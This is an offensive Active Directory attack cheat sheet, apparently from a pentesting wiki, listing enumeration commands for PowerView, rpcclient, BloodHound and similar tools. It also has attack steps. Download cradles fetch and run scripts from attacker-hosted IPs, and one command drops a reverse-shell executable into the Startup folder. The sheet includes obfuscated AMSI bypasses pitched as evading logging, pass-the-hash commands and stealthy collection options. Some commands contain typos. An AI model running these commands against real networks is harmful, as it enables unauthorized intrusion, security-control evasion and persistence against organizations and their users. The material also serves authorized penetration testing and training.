# ⭕ Enumeration

## <mark style="color:red;">Quick Checks</mark>

#### <mark style="color:green;">Low-privilege enumeration with powershell (no admin rights).</mark>

```powershell
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# 


# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

## <mark style="color:red;">Network Enumerating</mark>&#x20;

If you just have access to an AD environment but you don't have any credentials/sessions.

### <mark style="color:orange;">**Check for null and Guest Access on SMB Services**</mark>

{% hint style="info" %}
**for old versions of windows, probably wont find it anymore.**
{% endhint %}

```shell
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>

smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>

smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```

### <mark style="color:orange;">**Enumerate LDAP**</mark>

A lot of information on an AD domain can be obtained through LDAP. Most of the information can only be obtained with an authenticated bind but metadata (naming contexts, dns server name, domain functional level) can be obtainable anonymously, even with anonymous binding disabled.

{% hint style="info" %}
LDAP anonymous binding is usually disabled but it's worth checking.
{% endhint %}

```shell
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
ldapdomaindump -u DOMAIN\\username -p password -d domain.local
```

### <mark style="color:orange;">Find systems with SMB signing disabled</mark>

{% hint style="info" %}
Can use these systems for SMB relay later on.
{% endhint %}

By default, windows servers and domain controllers a have this enabled but its disabled by default on workstations.

```shell
 nmap --script smb2-security-mode -p 445 192.168.56.1/24
```

## <mark style="color:red;">**Enum Shares**</mark>

#### <mark style="color:green;">from outside:</mark>

```shell
smbmap -H 10.10.10.100    # null session
smbmap -H 10.10.10.100 -R # recursive listing
smbmap -H 10.10.10.100 -d test.local -u username -p password


smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
use Sharename # select a Sharename
cd Folder     # move inside a folder
ls            # list files


pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
pth-smbclient -U "MEGA/administrator%password.123" //192.168.56.103/SYSVOL
ls  # list files
cd  # move inside a folder
get # download files
put # replace a file
```

<mark style="color:green;">Mount a share</mark>

```shell
sudo apt install cifs-utils

sudo mount -t cifs -o vers=1.0,username=user_name //server_name/share_name /mnt/data
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```

#### <mark style="color:green;">from inside (powrview):</mark>

```powershell
get-netshare  
get-dfsshare
get-netfileserver 

#Enumerate Domain Shares
Find-DomainShare 

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess  (powrview)

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```

## <mark style="color:red;">Enum DHCP</mark>

When connecting a computer to most enterprise networks, if the Dynamic Host Configuration Protocol (DHCP) is enabled, it will assign an IP address to that computer, and send a lot of information. Nameservers and domain names are usually set through DHCP offer packets. On UNIX-like systems, the /etc/resolv.conf file will store information for name resolution operations after the DHCP offer.

```shell
nmap --script broadcast-dhcp-discover
```

{% hint style="info" %}
In many cases, there will be MAC address filtering, static IP addressing, VLANs or NAC (Network Access Control) that can prevent testers from obtaining this information. In those situations, wireshark can be used to manually inspect broadcast and multicast packets that travel on the network and find valuable information that could help bypass those mitigation.



#### We can  also spoof a fake [DHCP](broken-reference) or [DHCPv6](broken-reference) server and capture some password hashes.
{% endhint %}

## <mark style="color:red;">Enum MSRPC</mark>

MS-RPC (Microsoft Remote Procedure Call) is a protocol that allows requesting service from a program on another computer without having to understand the details of that computer's network. An MS-RPC service can be accessed through different transport protocols, among which:

#### . a network SMB pipe (listening ports are 139 & 445)&#x20;

#### . plain TCP or plain UDP (listening port set at the service creation)&#x20;

#### . a local SMB pipe

RPC services over an SMB transport, i.e. port 445/TCP, are reachable through "named pipes"' (through the `IPC$` share). There are many interesting named pipes that allow various operations from NULL sessions context, to local administrative context.

### <mark style="color:orange;">Find exposed services</mark> <a href="#find-exposed-services" id="find-exposed-services"></a>

The epmapper (MS-RPC EndPoint Mapper) maps services to ports. It uses port 135/TCP and/or port 593/TCP (for RPC over HTTP).

```shell
# with rpcdump.py (example with target port 135/TCP)
rpcdump.py -port 135 $TARGET_IP

# with rpcdump.exe (example with target port 593/TCP)
rpcdump.exe -p 593 $TARGET_IP
```

### <mark style="color:orange;">Null sessions</mark> <a href="#null-sessions" id="null-sessions"></a>

NULL sessions are unauthenticated SMB sessions that allow attackers to operate RPC calls through SMB named pipes without being authenticated first. This allows for many recon techniques like the enumeration of domain and local information (users, groups, RIDs, SIDs, policies, etc.)

### <mark style="color:orange;">Recon through interesting named pipes</mark> <a href="#recon-through-interesting-named-pipes" id="recon-through-interesting-named-pipes"></a>

The Samba utility named rpcclient can be used to operate recon through MS-RPC services behind SMB named pipes. It offers multiple useful commands.

```shell
lsaquery: get domain name and SID (Security IDentifier)
enumalsgroups builtin: list local groups, returns RIDs (Relative IDs)
queryaliasmem <RID>: list local group members, returns SIDs
lookupsids <SID>: resolve SID to name
lookupnames <NAME>: resolve name to SID
enumdomusers: list users, equivalent to net user /domain
enumdomgroups: list groups equivalent to net group /domain
queryuser <rid/name>: obtain info on a user, equivalent to net user <user> /domain
querygroupmem <rid>: obtain group members, equivalent to net group <group> /domain
getdompwinfo: get password policy

# example
rpcclient -c "command1,command2" $TARGET_IP
```

### <mark style="color:orange;">RID Cycling</mark> <a href="#rid-cycling" id="rid-cycling"></a>

RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential.

The Python [ridenum](domain-enumeration.md#enumerating-with-no-access-creds) script can be used to operate that recon technique, with a Null session or with an authenticated one.

{% hint style="info" %}
impacket can also be used to cycle through a number of RIDs with credentials and enumerate all the users.
{% endhint %}

## <mark style="color:red;">Enum DNS</mark>

AD-DS (Active Directory Domain Services) rely on DNS SRV RR (service location resource records). Those records can be queried to find the location of some servers: the global catalog, LDAP servers, the Kerberos KDC and so on.

### <mark style="color:orange;">dnsutil</mark>

nslookup is a DNS client that can be used to query SRV records. It usually comes with the dnsutil package.

```shell
# find the PDC (Principal Domain Controller)
nslookup -type=srv _ldap._tcp.pdc._msdcs.$FQDN_DOMAIN
​
# find the DCs (Domain Controllers)
nslookup -type=srv _ldap._tcp.dc._msdcs.$FQDN_DOMAIN
​
# find the GC (Global Catalog, i.e. DC with extended data)
nslookup -type=srv gc._msdcs.$FQDN_DOMAIN
​
# Other ways to find services hosts that may be DCs 
nslookup -type=srv _kerberos._tcp.$FQDN_DOMAIN
nslookup -type=srv _kpasswd._tcp.$FQDN_DOMAIN
nslookup -type=srv _ldap._tcp.$FQDN_DOMAIN
```

### <mark style="color:orange;">nmap</mark>

```shell
nmap --script dns-srv-enum --script-args dns-srv-enum.domain=$FQDN_DOMAIN
```

## <mark style="color:red;">Enum NBT-NS</mark>

```shell
# Name lookup on a range
nbtscan -r $SUBNET/$MASK
​
# Find names and workgroup from an IP address
nmblookup -A $IPAdress
```

## <mark style="color:red;">**MitM & Spoofing**</mark>

{% hint style="info" %}
The oldest and still, most effective technique is service spoofing and capturing NTLM hashes.
{% endhint %}

**Assuming that you are conected to the internal network (part of the domain) but dont have access to any system in the domain.**

#### **check out** [**MITM**](broken-reference)  **Section for a full list of these attacks.**

## <mark style="color:red;">Exploitation with Credentials</mark>

{% hint style="info" %}
After capturing the hashes, we can get out initial access to one of the joined systems and move up to DC.
{% endhint %}

#### Check [crackmapexec](broken-reference) and [Impacket ](broken-reference)sections.

## <mark style="color:red;">Load scripts in Memory</mark>

### <mark style="color:orange;">**Load PowerShell script reflectively**</mark>

To avoid signature based detection we should load our tools and scripts directly into target system mmoey:

```powershell
# proxy-aware
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')

# non-proxy aware
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText

```

for creating an opsec-safe downloader and obfuscator check out:

{% embed url="https://github.com/danielbohannon/Invoke-CradleCrafter" %}

{% hint style="info" %}
In some cases windows defender will be triggered if you try to load scripts from known public sources such as github so its better if you host the script on your own machine or somewhere else.
{% endhint %}

### <mark style="color:orange;">Download Files</mark>

```powershell
# Any version
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")

# Powershell 4+
## You can use 'IWR' as a shorthand
Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
```

#### for more file transfer techniques, check out [this section](broken-reference).

### <mark style="color:orange;">Bypass AMSI</mark>

‘Plain’ AMSI bypass example:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

run this to bypass AMSI in the current powershell terminal that you are using:

```powershell
powershell -ep bypass

SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another bypass, which is not detected by PowerShell autologging:

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}

#### For more info about AMSI refer to the [AMSI bypass](broken-reference) in AV Evasion.

## <mark style="color:red;">Loading Enumeration Tools</mark>

### [winapsearch](https://github.com/ropnop/windapsearch)

```shell
git clone https://github.com/ropnop/windapsearch.git

apt install python3-ldap

# enute the AD with credentials via WPAD
python3 windapsearch.py -d megabank.local -u megabank\\Administrator -p "letmein.123" --dc-ip 192.168.56.103 -U -o output

# other options:

 --functionality       Enumerate Domain Functionality level. Possible through anonymous bind
  -G, --groups          Enumerate all AD Groups
  -U, --users           Enumerate all AD Users
  -PU, --privileged-users
                        Enumerate All privileged AD Users. Performs recursive lookups for nested members.
  -C, --computers       Enumerate all AD Computers
  -m GROUP_NAME, --members GROUP_NAME
                        Enumerate all members of a group
  --da                  Shortcut for enumerate all members of group 'Domain Admins'. Performs recursive
                        lookups for nested members.
  --admin-objects       Enumerate all objects with protected ACLs (i.e. admins)
  --user-spns           Enumerate all users objects with Service Principal Names (for kerberoasting)
  --unconstrained-users
                        Enumerate all user objects with unconstrained delegation
  --unconstrained-computers
                        Enumerate all computer objects with unconstrained delegation
  --gpos                Enumerate Group Policy Objects
  -s SEARCH_TERM, --search SEARCH_TERM
                        Fuzzy search for all matching LDAP entries
  -l DN, --lookup DN    Search through LDAP and lookup entry. Works with fuzzy search. Defaults to printing
                        all attributes, but honors '--attrs'
  --custom CUSTOM_FILTER
                        Perform a search with a custom object filter. Must be valid LDAP filter syntax
```

### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```powershell
# host the script & load in memory
# from powershell:
iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
pwoe
# from cmd:
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
```

#### <mark style="color:green;">PowerView Cheat Sheet</mark>

```powershell
# Get all users in the current domain
Get-DomainUser | select -ExpandProperty cn

# Get all computers in the current domain
Get-DomainComputer

# Get all domains in current forest
Get-ForestDomain

# Get domain/forest trusts
Get-DomainTrust
Get-ForestTrust

# Get information for the DA group
Get-DomainGroup "Domain Admins"

# Find members of the DA group
Get-DomainGroupMember "Domain Admins" | select -ExpandProperty membername

# Find interesting shares in the domain, ignore default shares, and check access
Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess

# Get OUs for current domain
Get-DomainOU -FullData

# Get computers in an OU
# %{} is a looping statement
Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname

# Get GPOs applied to a specific OU
Get-DomainOU *WS* | select gplink
Get-DomainGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"

# Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain
Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers

# Get the computers where users are part of a local group through a GPO restricted group
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName

# Find principals that can create new GPOs in the domain
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=targetdomain,DC=com" -ResolveGUIDs | ?{ $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Find principals that can link GPOs to OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier

# Get incoming ACL for a specific object
Get-DomainObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

# Find interesting ACLs for the entire domain, show in a readable (left-to-right) format
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft

# Get interesting outgoing ACLs for a specific user or group
# ?{} is a filter statement
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights
```

#### <mark style="color:green;">Lateral Movement Cheat Sheet:</mark>

```powershell
# Find existing local admin access for user 
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

### [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

```c
git clone https://github.com/dirkjanm/ldapdomaindump.git
#or
pip install ldapdomaindumpPowerView Cheat Sheet

python ldapdomaindump.py
#or
python -m ldapdomaindump
ldapdomaindump
```

### <mark style="color:blue;">Enum4linux</mark>

```bash
enum4linux -u administrator -p letmein.1234 -a 192.168.56.103
```

### [ADRecon](https://github.com/sense-of-security/ADRecon)

```powershell
git clone https://github.com/sense-of-security/ADRecon.git

#  run ADRecon on a domain member host
.\ADRecon.ps1

# run ADRecon on a domain member host as a different user.
.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon on a non-member host using LDAP
.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers

# generate the ADRecon-Report.xlsx based on ADRecon output (CSV Files).
.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
```

#### When you run ADRecon, a `ADRecon-Report-<timestamp>` folder will be created which will contain ADRecon-Report.xlsx and CSV-Folder with the raw files.

### [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

```powershell
powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
```

## <mark style="color:red;">Domain Mapping</mark>

{% hint style="info" %}
bloodhound scripts can be executed both remotely and locally.
{% endhint %}

{% embed url="https://bloodhound.readthedocs.io/en/latest" %}

### [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)

```powershell
# require: Install-Module -name Az -AllowClobber
# require: Install-Module -name AzureADPreview -AllowClobber
Connect-AzureAD
Connect-AzAccount
. .\AzureHound.ps1
Invoke-AzureHound
```

### [sharphound ](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)& [BloodHound](https://github.com/BloodHoundAD/BloodHound)

```powershell
# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23


# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

# with the newer version of bloodhound.ps1
powershell-import /path/to/BloodHound.ps1
powershell Get-BloodHoundData | Export-BloodHoundCSV
```

Then import the zip/json files into the Neo4J database and query them.

```shell
root@payload$ apt install bloodhound 

# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j

root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
```

{% hint style="info" %}
we can use the exe version without argument and get the same output. download and extract it and upload all files in bloodhound UI.
{% endhint %}

### [bloodhound - python](https://github.com/fox-it/BloodHound.py)

{% hint style="info" %}
#### This needs credentials but its FUD and runs remotely.
{% endhint %}

```python
pip install bloodhound
bloodhound-python -c ALL -d megacorp.local -u client1 -p password123 -ns [domain controller ip]
```

#### this will dump all domain info to the attackers machine remotely without being detected but you need to have the credentials for at least a low-privilege user in the domain.

## <mark style="color:red;">Domain & System Info</mark>

### <mark style="color:orange;">Domain Info</mark>

```powershell
Get-NetDomain
get-netforest
get-netforestdomain
Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
# or
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

### <mark style="color:orange;">get domain controllers</mark>

```powershell
Get-NetDomainController
Get-NetDomainController -Domain <DomainName>
```

### <mark style="color:orange;">**Enum Domain Trust**</mark>

```powershell
Get-NetDomainTrust
Get-NetDomainTrust -Domain <DomainName>
```

### <mark style="color:orange;">**Enum Forest Trust**</mark>

```powershell
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest <ForestName>
```

## <mark style="color:orange;">Domain Computers</mark>

```powershell
Get-AdComputer -filter *
Get-NetComputer -FullData
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

#### <mark style="color:green;">Get All Computers by Name</mark>

This will list all the computers in the domain and only display the hostname

```powershell
Get-ADComputer -filter * | select name
```

#### <mark style="color:green;">Get All Computers from an OU</mark>

```powershell
Get-ADComputer -SearchBase "OU=DN" -Filter *
```

#### <mark style="color:green;">Get a Count of All Computers in Domain</mark>

```powershell
Get-ADComputer -filter * | measure
```

#### <mark style="color:green;">Get all Windows 10 Computers</mark>

Change Windows 10 to any OS you want to search for

```powershell
Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem
```

#### <mark style="color:green;">Get a Count of All computers by Operating System</mark>

This will provide a count of all computers and group them by the operating system. A great command to give you a quick inventory of computers in AD.

```powershell
Get-ADComputer -Filter "name -like '*'" -Properties operatingSystem | group -Property operatingSystem | Select Name,Count
```

#### <mark style="color:green;">Delete a single Computer (need privileges)</mark>

```powershell
Remove-ADComputer -Identity "USER04-SRV4"
```

#### <mark style="color:green;">Delete a List of Computer Accounts (need privileges)</mark>

Add the hostnames to a text file and run the command below.

```powershell
Get-Content -Path C:ComputerList.txt | Remove-ADComputer
```

#### <mark style="color:green;">Delete Computers From an OU (need privileges)</mark>

```powershell
Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
```

## <mark style="color:red;">Users & Groups</mark>

### <mark style="color:orange;">**User Hunting**</mark>

```powershell
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

#Confirming admin access:
Invoke-UserHunter -CheckAccess
```

### <mark style="color:orange;">Users in the current domain</mark>

```powershell
Get-NetUser (Powerview)
Get-NetUser -Username student (Powerview)
Get-ADUser -Filter * -Properties * (Active Directory)
Get-ADUser -Identity student -properties * (Active Directory)
```

### <mark style="color:orange;">User Properties</mark>

```powershell
Get-UserProperty (Powerview)
Get-ADUser username -Properties *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  (powershell)
```

### <mark style="color:orange;">Find Local Admins</mark>

```powershell
find-localadminaccess -verbose
```

#### <mark style="color:green;">Finds which machines users of a specified group are logged into</mark>

```powershell
get-help Invoke-UserHunter -examples
Invoke-UserHunter
get-help Invoke-UserHunter
```

### <mark style="color:orange;">Get admin group members</mark>

```powershell
get-netgroupmember -groupname 'administrators'
get-netgroupmember -groupname 'Domain Admins' -recurse
```

#### <mark style="color:green;">check logon count for all users in the domain</mark>

```powershell
get-userproperty -properties logoncount
```

### <mark style="color:orange;">last password set time</mark>

```powershell
Get-UserProperty -Properties pwdlastset (Powerview)
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -Membertype *Property | select Name        (Active Directory)
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}    (Active Directory)
```

### <mark style="color:orange;">Get Users by Name</mark>

```powershell
get-Aduser -Filter {name -like "*robert*"}
```

### <mark style="color:orange;">Get All Disable User Accounts</mark>

```powershell
Search-ADAccount -AccountDisabled | select name
Search-ADAccount -AccountDisabled
```

<mark style="color:green;">Disable User Account (need privileges)</mark>

```powershell
Disable-ADAccount -Identity rallen
```

<mark style="color:green;">Enable User Account (need privileges)</mark>

```powershell
Enable-ADAccount -Identity rallen
```

### <mark style="color:orange;">Get the SID of the krbtgt account</mark>

```powershell
Get-ADUser -Identity krbtgt
```

#### <mark style="color:green;">Find All Locked User Accounts</mark>

```powershell
Search-ADAccount -LockedOut
```

#### <mark style="color:green;">Unlock User Account (need privileges)</mark>

```powershell
Unlock-ADAccount –Identity john.smith
```

### <mark style="color:orange;">Get All Accounts with Password Set to Never Expire</mark>

```powershell
get-aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
```

### <mark style="color:orange;">Get all GPOs by status</mark>

```powershell
get-GPO -all | select DisplayName, gpostatus
```

### <mark style="color:orange;">Listing the group members of a group</mark>

```powershell
Get-ADGroupMember -Identity [group name ]
```

<mark style="color:green;">Get All members Of A Security group</mark>

```powershell
Get-ADGroupMember -identity “HR Full”
```

<mark style="color:green;">Get Group by keyword</mark>

```powershell
get-adgroup -filter * | Where-Object {$_.name -like "*group-name*"}
```

<mark style="color:green;">Get all the groups in the current domain PowerView</mark>

```powershell
Get-NetGroup
Get-NetGroup *admin*
```

### <mark style="color:orange;">**Enum Group Policies**</mark>

```powershell
Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName <Name of the PC>
Get-NetGPOGroup

#Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName <ComputerName>
```

others options:

```powershell
#Get a spesific "string" on a user's attribute
Find-UserField -SearchField Description -SearchTerm "wtver"

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

## <mark style="color:red;">**Enum OUs**</mark>

```powershell
Get-NetOU -FullData 
Get-NetGPO -GPOname <The GUID of the GPO>
```

## <mark style="color:red;">**Enum ACLs**</mark>

```powershell
# Returns the ACLs associated with the specified account
Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

#Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"

```

### <mark style="color:orange;">Get ACLs associated with the specified object</mark>

```powershell
Get-ObjectACL -SamAccountName user123 -ResolveGUIDs
```

### <mark style="color:orange;">Get ACLs associated with the specified prefix to be used for search</mark>

```powershell
Get-objectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

### <mark style="color:orange;">GenericWrite</mark>&#x20;

```powershell
Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
```

****
